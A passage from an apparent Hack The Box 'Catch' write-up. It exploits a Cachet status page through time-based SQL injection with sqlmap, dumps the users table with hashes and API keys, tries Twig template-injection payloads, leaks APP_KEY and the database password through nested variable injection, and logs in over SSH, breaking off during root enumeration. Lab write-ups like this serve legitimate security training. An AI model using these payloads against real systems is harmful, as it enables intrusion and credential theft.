+</pre><td class="rouge-code"><pre><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">status</span><span class="p">.</span><span class="n">catch</span><span class="p">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">v1</span><span class="o">/</span><span class="n">components</span><span class="o">?</span><span class="n">name</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&amp;</span><span class="mi">1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&amp;</span><span class="mi">1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">=</span><span class="k">or</span><span class="o">+%</span><span class="mi">27</span><span class="n">a</span><span class="o">%</span><span class="mi">27</span><span class="o">=%</span><span class="mi">27</span><span class="n">a</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span><span class="o">%</span><span class="mi">20</span><span class="p">(</span><span class="k">select</span><span class="o">%</span><span class="mi">20</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="c1">--</span>
+</pre></table></code></div></div><p>Using sqlmap I was able to find a working payload as well (this took a long time!)</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">Payload</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">status</span><span class="p">.</span><span class="n">catch</span><span class="p">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">v1</span><span class="o">/</span><span class="n">components</span><span class="o">?</span><span class="n">name</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&amp;</span><span class="mi">1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&amp;</span><span class="mi">1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">=</span><span class="k">or</span><span class="o">+</span><span class="s1">'a'</span><span class="o">=?</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="mi">7346</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">ZNEp</span><span class="p">)</span><span class="o">+</span><span class="c1">--+"</span>
+</pre></table></code></div></div><p>After this it was able to very slowly get the table names…very slowly. like…1 character per few seconds slow… Time-based SQL injection enumeration and exploitation is not recomended if you are in a time crunch!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>[19:21:09] [INFO] retrieved: cachet
+[19:21:30] [INFO] retrieved: mysql
+[19:21:49] [INFO] retrieved: performance_schema
+[19:22:57] [INFO] retrieved: sys
+[19:23:10] [INFO] fetching tables for databases: 'cachet, information_schema, mysql, performance_schema, sys'
+[19:23:10] [INFO] fetching number of tables for database 'cachet'
+[19:23:10] [INFO] retrieved: 25
+[19:23:15] [INFO] retrieved: actions
+[19:23:41] [INFO] retrieved: cache
+[19:23:57] [INFO] retrieved: component_groups
+[19:25:07] [INFO] retrieved: components
+[19:25:21] [INFO] retrieved: failed_jobs
+[19:26:04] [INFO] retrieved: incident_components
+[19:27:23] [INFO] retrieved: incident_templates
+[19:28:09] [INFO] retrieved: incident_updates
+[19:28:46] [INFO] retrieved: incidents
+[19:28:59] [INFO] retrieved: invites
+[19:29:20] [INFO] retrieved: jobs
+[19:29:36] [INFO] retrieved: meta
+[19:29:50] [INFO] retrieved: metric_points
+[19:30:37] [INFO] retrieved: metrics
+[19:30:48] [INFO] retrieved: migrations
+[19:31:21] [INFO] retrieved: notifications
+[19:32:10] [INFO] retrieved: schedule_components
+[19:33:30] [INFO] retrieved: schedules
+[19:33:43] [INFO] retrieved: sessions
+[19:34:10] [INFO] retrieved: settings
+[19:34:37] [INFO] retrieved: subscribers
+[19:35:10] [INFO] retrieved: subscriptions
+[19:35:44] [INFO] retrieved: taggables
+[19:36:14] [INFO] retrieved: tags
+[19:36:22] [INFO] retrieved: users
+</pre></table></code></div></div><p>I stopped the torture after the tables from the first database were enumerated. I forgot to get databases before I asked it to get tables, so this would have taken a very long time to complete!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/catch]
+└─$ sqlmap -u 'http://status.catch.htb:8000/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)*+--+"' -D cachet -T users --dump
+</pre></table></code></div></div><p>I used the above command to dump the contents of the <code class="language-plaintext highlighter-rouge">cachet.users</code> table.</p><p>While I was waiting for the database to finish its painfully slow enumeration, I went out to eat with friends.</p><h3 id="the-mysql-cachetusers-database">The MySQL cachet.users database</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>Database: cachet
+Table: users
+[2 entries]
++----+-----------------+--------+---------+----------------------+--------------------------------------------------------------+----------+----------+---------------------+---------------------+--------------------------------------------------------------+-------------------+
+| id | email           | active | level   | api_key              | password                                                     | username | welcomed | created_at          | updated_at          | remember_token                                               | google_2fa_secret |
++----+-----------------+--------+---------+----------------------+--------------------------------------------------------------+----------+----------+---------------------+---------------------+--------------------------------------------------------------+-------------------+
+| 1  | admin@catch.htb | 1      | 1       | rMSN8kJN9TPADl2cWv8N | $2y$10$quY5ttamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHpVK2Wj7Om | admin    | 1        | 2022-03-03 02:51:26 | 2022-03-03 02:51:35 | 5t3PCyAurH7oKann9dhMfL7t0ZTN7bz4yiASDB8EAfkAOcN60yx0YTfBBlPj | NULL              |
+| 2  | john@catch.htb  | 1      | 2       | 7GVCqTY5abrox48Nct8j | $2y$10$2jcDURPAEbv2EEKto0ANb.jcjgiAwWzkwzZKNT9fUpOziGjJy5r8e | john     | 1        | 2022-03-03 02:51:57 | 2022-03-03 02:52:12 | 5N58LraMhWCeM6kVL1OgADG4DoUkViSmJLowCth6ocSLv9s7DyDmNWgYEJlB | NULL              |
++----+-----------------+--------+---------+----------------------+--------------------------------------------------------------+----------+----------+---------------------+---------------------+--------------------------------------------------------------+-------------------+
+</pre></table></code></div></div><p>Interestingly there were only two users, which significantly sped up the process, and it finished some time before I got home. I now also had some sort of API key for both <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">admin</code>, as well as potential password hashes to crack. Next I did some research into what I could possibly do with those API keys.</p><ul><li>https://docs.cachethq.io/docs/api-authentication</ul><blockquote><p>API Token</p><p>The API Token is generated at installation time for the main user or when a new team member is added to your status page and can be found on your profile page (click your profile picture to get there). Once you have your token you’ll need to add a new request header of <code class="language-plaintext highlighter-rouge">X-Cachet-Token: TOKEN</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-H</span> <span class="s2">"Content-Type: application/json;"</span> <span class="nt">-H</span> <span class="s2">"X-Cachet-Token: YOUR_KEY_HERE"</span> <span class="nt">-d</span> <span class="s1">'{"name":"API","description":"An example description","status":1}'</span> http://status.cachethq.io/api/v1/components
+</pre></table></code></div></div></blockquote><p>Now I needed to figure out the url to connect to.</p><ul><li>https://docs.cachethq.io/docs/base-url<blockquote><p>Don’t forget to use your own URL! The URL provided above is an example domain, you must provide your own when running requests.</p></blockquote></ul><p>Looked like more brute force time</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_13_api_dirbust.png" alt="Dirbuster output showing the enumerated endpoints in the /api/v1 folder" /></p><p>Checked dirbuster to see if I could figure out what the local custom domain was. I got back a list of interesting endpoints.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_12_ping.png" alt="Using Burp suite to interact with the ping API and getting back pong" /></p><p>I tried multiple of the interesting sounding endpoints to see how they would respond. I got a “Pong!” back from the <code class="language-plaintext highlighter-rouge">/ping</code> API.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_14_incidents.png" alt="Using Burp suite to get json output from the incidents API" /></p><p>After testing a few of them, I found that I had to send data to get them to respond. Because of that, I decided to try POST to see if I could upload data.</p><ul><li>https://docs.cachethq.io/docs/post-parameters</ul><p>After I changed GET to POST I got a 400 Bad Request error.</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="err">HTTP/</span><span class="mf">1.1</span><span class="w"> </span><span class="mi">400</span><span class="w"> </span><span class="err">Bad</span><span class="w"> </span><span class="err">Request</span><span class="w">
+</span><span class="err">Date:</span><span class="w"> </span><span class="err">Sun,</span><span class="w"> </span><span class="mi">17</span><span class="w"> </span><span class="err">Jul</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">49</span><span class="err">:</span><span class="mi">34</span><span class="w"> </span><span class="err">GMT</span><span class="w">
+</span><span class="err">Server:</span><span class="w"> </span><span class="err">Apache/</span><span class="mf">2.4</span><span class="err">.</span><span class="mi">29</span><span class="w"> </span><span class="err">(Ubuntu)</span><span class="w">
+</span><span class="err">Cache-Control:</span><span class="w"> </span><span class="err">no-cache,</span><span class="w"> </span><span class="err">private</span><span class="w">
+</span><span class="err">Content-Length:</span><span class="w"> </span><span class="mi">238</span><span class="w">
+</span><span class="err">Connection:</span><span class="w"> </span><span class="err">close</span><span class="w">
+</span><span class="err">Content-Type:</span><span class="w"> </span><span class="err">application/json</span><span class="w">
+
+</span><span class="p">{</span><span class="nl">"errors"</span><span class="p">:[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"844fb912-5cf0-4b81-a5d5-808f1e8f0fe7"</span><span class="p">,</span><span class="nl">"status"</span><span class="p">:</span><span class="mi">400</span><span class="p">,</span><span class="nl">"title"</span><span class="p">:</span><span class="s2">"Bad Request"</span><span class="p">,</span><span class="nl">"detail"</span><span class="p">:</span><span class="s2">"The request cannot be fulfilled due to bad syntax."</span><span class="p">,</span><span class="nl">"meta"</span><span class="p">:{</span><span class="nl">"details"</span><span class="p">:[</span><span class="s2">"The name field is required."</span><span class="p">,</span><span class="s2">"The status field is required."</span><span class="p">]}}]}</span><span class="w">
+</span></pre></table></code></div></div><p>The first error message told me that the name and status fields were required, so I supplied values for those.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_15_incident2.png" alt="Using Burp suite to get json error message from the incidents API" /></p><p>Next, I got an error message telling me that the status field must be an integer.</p><ul><li>https://docs.cachethq.io/docs/incident-statuses</ul><p>I found a page that explained what the integer status codes mapped to. I picked <code class="language-plaintext highlighter-rouge">0</code> for “Scheduled” to see if perhaps something was being automated to handle incidents that were scheduled.</p><p>Next, I got another error message that said “The message field is required”. The message field sounded like a likely place to do some injection, so I tried putting in cross site scripting attempts, and a reverse shell. These did not seem to do anything however, so I did some more reading on what Cachet was using to process these JSON messages. This led me to <code class="language-plaintext highlighter-rouge">Twig</code>.</p><ul><li>https://twig.symfony.com/<blockquote><p>Twig is a modern template engine for PHP</p></blockquote></ul><p>I googled “twig template exploit” and found an interesting blog post.</p><ul><li>https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9</ul><p>Apparently this type of attack is called server side template injection (SSTI).</p><ul><li>https://portswigger.net/research/server-side-template-injection</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_16_incident_message.png" alt="Using Burp suite to get valid json message from the incidents API" /></p><p>I created a couple of new incidents using this attack method as a test.</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nl">"permalink"</span><span class="p">:</span><span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">status.catch.htb:8000</span><span class="se">\/</span><span class="s2">incidents</span><span class="se">\/</span><span class="s2">2"</span><span class="w">
+</span></pre></table></code></div></div><p>Using a GET request I was able to get the incidents I had created back, and noticed that there was a permalink at the bottom of each.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_17_vuln_identified.png" alt="Visiting the incident page to verify code execution" /></p><p>Going to this permalink showed the number <code class="language-plaintext highlighter-rouge">49</code> which meant there was code execution!</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">{{</span><span class="nx">_self</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">registerUndefinedFilterCallback</span><span class="p">(</span><span class="dl">"</span><span class="s2">exec</span><span class="dl">"</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">getFilter</span><span class="p">(</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">)}}</span>
+</pre></table></code></div></div><p>I found the above example exploit on the blog post and used it to see if I could run arbitrary system commands as well.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>
+<span class="o">&lt;</span><span class="nx">div</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">markdown-body</span><span class="dl">"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="dl">'</span><span class="s1">{{_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)}}{{_self.env.getFilter(&amp;quot;id&amp;quot;)}}</span><span class="dl">'</span><span class="o">&lt;</span><span class="sr">/p</span><span class="err">&gt;
+</span></pre></table></code></div></div><p>After creating a new incident using this payload I navigated to the permalink page and found that it was blank. It didn’t even have the name header or anything. I check in the source of the page to see if I could figure out what had happened and found that the code was there, but the quotes had been encoded.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">div</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">markdown-body</span><span class="dl">"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">{{</span><span class="nx">_self</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">registerUndefinedFilterCallback</span><span class="p">(</span><span class="dl">'</span><span class="s1">exec</span><span class="dl">'</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">getFilter</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">}}</span><span class="o">&lt;</span><span class="sr">/p</span><span class="err">&gt;
+</span></pre></table></code></div></div><p>On my next attempt I found that using single quotes fixed the encoding problem, but there was still no code execution inside the <code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> tags. Next I tried a different payload.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">div</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">markdown-body</span><span class="dl">"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">{{[</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="dl">'</span><span class="s1">system</span><span class="dl">'</span><span class="p">)}}</span><span class="o">&lt;</span><span class="sr">/p</span><span class="err">&gt;
+</span></pre></table></code></div></div><p>This led the code to display the message <code class="language-plaintext highlighter-rouge">["id"]</code> on the page, so I seemed to be getting closer.</p><p>I thought that perhaps the rendering engine was blocking execution, but maybe in the backend it was working. After extensive testing, this ended up not being true, and this route seemed like a dead end. I went back to looking at the other CVEs to see if a different one would get me further.</p><ul><li>https://github.com/advisories/GHSA-88f9-7xxh-c688<li>https://github.com/narkopolo/CVE-2021-39174-PoC/blob/main/exploit.py</ul><p>AFter looking at this PoC and seeing that it needed credentials I went back to my notes and realized I had a username and password I had gotten from the chat: <code class="language-plaintext highlighter-rouge">john : E}V!mywu_69T4C}W</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/catch]
+└─$ python ./cachet.py -n john -p 'E}V!mywu_69T4C}W' -u 'http://status.catch.htb:8000/'       
+[+] Getting CSRF token
+[+] CSRF token: DKnz1nWiL8Irrdgkm1IOXYmPveMbzTU2AiIdVDzc
+[+] Logging in as user 'john'
+[+] Successfully logged in
+[+] Getting current field values
+[+] Sending payload
+Traceback (most recent call last):
+  File "/home/zweilos/htb/catch/./cachet.py", line 141, in &lt;module&gt;
+    extracted = extract_variables(dotenv_variables.splitlines())
+  File "/home/zweilos/htb/catch/./cachet.py", line 128, in extract_variables
+    payload_response = soup.find("input", {"name": "config[mail_address]"})["value"]
+TypeError: 'NoneType' object is not subscriptable
+</pre></table></code></div></div><p>I tried running the Python PoC with the credentials I had found. It logged in successfully, but for some reason the script failed when sending the payload.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_18_dashboard.png" alt="The incident dashboard after logging in to cachet" /></p><p>The python script did not work, but I was able to log into the dashboard using the login page I had found earlier.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_19_appsetup.png" alt="There was an application URL on a different IP on the application setup page" /></p><p>I found another IP to check out for the future on the Application Setup page: <code class="language-plaintext highlighter-rouge">http://10.129.136.74:8001</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_19_template.png" alt="" /></p><p>I tried creating a Template using the template injection example I found on the earlier blog post.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_21_template2.png" alt="" /></p><p>I also attempted to create a reverse shell, thinking perhaps it was only output that was being filtered on the permalink pages.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_23_incident_report.png" alt="Creating a new incident using different code tests" /></p><p>I also created incidents, inserting multiple different payloads from different sources to see if any would go through. This was after I realized the Template was just a template for the messages field in the incidents being created.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_22_incident.png" alt="Visiting the incidents page after creating one in the GUI" /></p><p>No matter what payload I tried injected here, only the basic functions such as math got me a visible code execution result. I decided to move on and do some more reading on the subject.</p><h2 id="nested-variable-assignment-vulnerability">Nested Variable Assignment Vulnerability</h2><p>I found another blog that mentioned something called “Nested Variable assignment”. This involved invoking application environment variables by stuffing the call to them inside another variable.</p><ul><li><p>https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/</p><li><p>https://github.com/vlucas/phpdotenv#nesting-variables</p></ul><p>I found that the <code class="language-plaintext highlighter-rouge">APP_KEY</code> variable, if leaked, could lead to code execution, so it seemed like a good target. After checking back with the Python PoC, I noticed that it was stuffing each of the variables it was targeting into the payload.</p><h3 id="app_key">APP_KEY</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_24_app_key.png" alt="Using the third CVE to retrieve the app key" /></p><p>I was able to get the APP_KEY <code class="language-plaintext highlighter-rouge">base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=</code> by using the nested variable <code class="language-plaintext highlighter-rouge">${APP_KEY}</code> into the vulnerable field on the Mail setting page.</p><h3 id="db_password">DB_PASSWORD</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_25_DB_PASSWORD.png" alt="Using the third CVE to retrieve the database password" /></p><p>Using the same vulnerability, I was able to use the variable <code class="language-plaintext highlighter-rouge">${DB_PASSWORD}</code> to get the database password <code class="language-plaintext highlighter-rouge">s2#4Fg0_%3!</code>.</p><p>I had to refresh the page between each insert to be able to see the contents of the targeted variable.</p><h2 id="initial-foothold">Initial Foothold</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/catch]
+└─$ ssh will@10.10.11.150                                                                                       
+will@10.10.11.150's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 17 Jul 2022 11:21:13 PM UTC
+
+  System load:                      0.08
+  Usage of /:                       74.7% of 16.61GB
+  Memory usage:                     85%
+  Swap usage:                       25%
+  Processes:                        440
+  Users logged in:                  0
+  IPv4 address for br-535b7cf3a728: 172.18.0.1
+  IPv4 address for br-fe1b5695b604: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.150
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:3f59
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+will@catch:~$ id &amp;&amp; hostname
+uid=1000(will) gid=1000(will) groups=1000(will)
+catch
+</pre></table></code></div></div><p>Using the <code class="language-plaintext highlighter-rouge">DB_PASSWORD</code> I was able to SSH into the machine with the username <code class="language-plaintext highlighter-rouge">will</code> (Danger Will Robinson!).</p><h3 id="usertxt">User.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>will@catch:~$ ls -la
+total 32
+drwxr-xr-x 4 will will 4096 Jul 17 23:21 .
+drwxr-xr-x 4 root root 4096 Dec 14  2021 ..
+lrwxrwxrwx 1 will will    9 Dec 14  2021 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 will will  220 Dec 14  2021 .bash_logout
+-rw-r--r-- 1 will will 3771 Dec 14  2021 .bashrc
+drwx------ 2 will will 4096 Jul 17 23:21 .cache
+drwxrwxr-x 3 will will 4096 Dec 14  2021 .local
+-rw-r--r-- 1 will will  807 Dec 14  2021 .profile
+-rw-r----- 1 root will   33 Jul 17 23:05 user.txt
+will@catch:~$ cat user.txt
+982be8c2865553ea4e0929cf5ba18de7
+</pre></table></code></div></div><p>FINALLY!! After hours of looking for creds in all the wrong places, I was in and was able to get the user flag.</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user-will">Enumeration as user <code class="language-plaintext highlighter-rouge">will</code></h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>will@catch:~$ sudo -l
+[sudo] password for will: 
+Sorry, user will may not run sudo on catch.
+</pre></table></code></div></div><p>Unfortunately, <code class="language-plaintext highlighter-rouge">sudo -l</code> showed that <code class="language-plaintext highlighter-rouge">will</code> was not part of the <code class="language-plaintext highlighter-rouge">sudoers</code> group.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>root         970  0.0  0.0   6812  2260 ?        Ss   Jul17   0:00 /usr/sbin/cron -f
+root         992  0.0  0.0   8352  1804 ?        S    Jul17   0:00  _ /usr/sbin/CRON -f
+root        1017  0.0  0.0   2608   408 ?        Ss   Jul17   0:00      _ /bin/sh -c cd /root/lets-chat;/usr/bin/npm start
+
+...output truncated...
+
+root       75832  0.0  0.0  18380  2948 ?        S    02:00   0:00      _ /bin/bash /root/check.sh
+root       75878  0.0  0.0   6708   936 ?        S    02:00   0:00          _ inotifywait -q -e modify /var/www/html/Cachet/.env
+</pre></table></code></div></div><p>Next I checked running processes, and noticed that there were a few different scripts running as root. One in particular was interesting because it targeted the Cachet files. The other was doing something with Lets Chat.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>╔══════════╣ Different processes executed during 1 min (interesting is low number of repetitions)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#frequent-cron-jobs                               
+     55 /bin/sh -c /root/reset.sh                                                                                   
+     55 /bin/bash /root/reset.sh
+     17 /bin/bash /etc/init.d/mysql start
+     16 /bin/sh -c /opt/mdm/verify.sh
+     16 /bin/bash /opt/mdm/verify.sh
+      5 jarsigner -verify /root/mdm/apk_bin/aaf31bedf4c97a72d5cb649f.apk
+      4 docker cp /root/.env 97c652e737a4:/var/www/html/Cachet/.env
+      4 docker cp /root/.env 7b20ef63b871:/var/www/html/Cachet/.env
+      4 docker cp /root/.env 4e50cac873ae:/var/www/html/Cachet/.env
+      4 docker cp /root/.env 1c6af250c292:/var/www/html/Cachet/.env
+      3 docker cp /root/.env 97dac00b203d:/var/www/html/Cachet/.env
+      3 docker cp /root/.env 5bbd9c3d2d15:/var/www/html/Cachet/.env
+      3 docker cp /root/.env 3ef41b697e68:/var/www/html/Cachet/.env
+      2 /usr/sbin/mysqld --print-defaults
+      2 tr   \n
+      2 tail -n 1
+      2 grep -- --datadir
+      2 docker cp /root/.env e2a173d974c7:/var/www/html/Cachet/.env
+      2 docker cp /root/.env c8dd41cc63e6:/var/www/html/Cachet/.env
+      2 docker cp /root/.env 8becd235e1cb:/var/www/html/Cachet/.env
+      2 docker cp /root/.env 6f444f4ca12d:/var/www/html/Cachet/.env
+      2 docker cp /root/.env 443fe29f925d:/var/www/html/Cachet/.env
+      2 cut -d= -f2
+      1 docker ps -a -q
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">linpeas.sh</code> showed a number of interesting running processes, including those same scripts I had found.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
